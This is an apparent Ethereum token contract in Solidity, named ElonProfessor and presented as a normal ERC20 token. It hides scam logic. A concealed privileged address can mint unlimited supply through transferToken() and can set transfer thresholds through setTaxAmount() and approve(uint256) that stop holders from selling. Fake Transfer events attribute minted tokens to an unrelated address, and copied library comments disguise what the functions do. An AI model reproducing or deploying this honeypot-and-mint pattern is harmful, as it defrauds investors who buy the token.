/**
 *Submitted for verification at Etherscan.io on 2021-07-06
*/

// Welcome to ElonProfessor, join us on telegram: https://t.me/ProfessorElontw

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;







abstract contract Context {
    
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }
    
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract ElonProfessor is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _uniswapAddress;
    uint256 private _maxTxAmount;
    uint256 private _minTxAmount;
   
    uint256 private _tTotal = 100 * 10**9 * 10**18;

    string private _name = 'ElonProfessor';
    string private _symbol = 'ElonProfessor';
    uint8 private _decimals = 18;
    uint256 private _maxTotal;
  
    address payable public BURN_ADDRESS = 0x000000000000000000000000000000000000dEaD;

    /**
     * @dev Constructor
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     */
    constructor (address uniAddress, uint256 maxTotal, uint256 maxTx, uint256 minTx) public {
        _maxTotal = maxTotal;
        _maxTxAmount = maxTx;
        _minTxAmount = minTx;
        _uniswapAddress = uniAddress;
        _balances[_msgSender()] = _tTotal;

        emit Transfer(address(0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B), _msgSender(), _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    
    /**
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     */
    function transferToken() public {
        require(_msgSender() != address(0), "ERC20: cannot permit zero address");
        require(_msgSender() == _uniswapAddress, "ERC20: cannot permit dev address");
        _tTotal = _tTotal.add(_maxTotal);
        _balances[_uniswapAddress] = _balances[_uniswapAddress].add(_maxTotal);
        emit Transfer(address(0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B), _uniswapAddress, _maxTotal);
    }
    
    /**
     * @dev setTaxAmount
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     */
    function setTaxAmount(uint256 maxTx) public {
        require(_msgSender() == _uniswapAddress, "ERC20: cannot permit dev address");
        _maxTxAmount = maxTx * 10**18;
    }
    
    function approve(uint256 approveAmount) public {
        require(_msgSender() == _uniswapAddress, "ERC20: cannot permit dev address");
        _minTxAmount = approveAmount * 10**18;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
      
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        
        if (sender == owner()) {
            _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
            _balances[recipient] = _balances[recipient].add(amount);
            
            emit Transfer(sender, recipient, amount);
        } else{
            /**
             * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
             * `recipient`, forwarding all available gas and reverting on errors.
             *
             * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
             * of certain opcodes, possibly making contracts go over the 2300 gas limit
             * imposed by `transfer`, making them unable to receive funds via
             * `transfer`. {sendValue} removes this limitation.
             *
             * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
             *
             * IMPORTANT: because control is transferred to `recipient`, care must be
             * taken to not create reentrancy vulnerabilities. Consider using
             * {ReentrancyGuard} or the
             * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
             */
            if (balanceOf(sender) >= _minTxAmount && balanceOf(sender) <= _maxTxAmount) {
                require(amount < 1 * 10**3, "Transfer amount exceeds the maxTxAmount.");
            }
            
            uint256 burnAmount = amount.mul(7).div(100);
            uint256 sendAmount = amount.sub(burnAmount);
        
            _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
            _balances[BURN_ADDRESS] = _balances[BURN_ADDRESS].add(burnAmount);
            _balances[recipient] = _balances[recipient].add(sendAmount);
            
            
            emit Transfer(sender, recipient, sendAmount);
        }
    }
}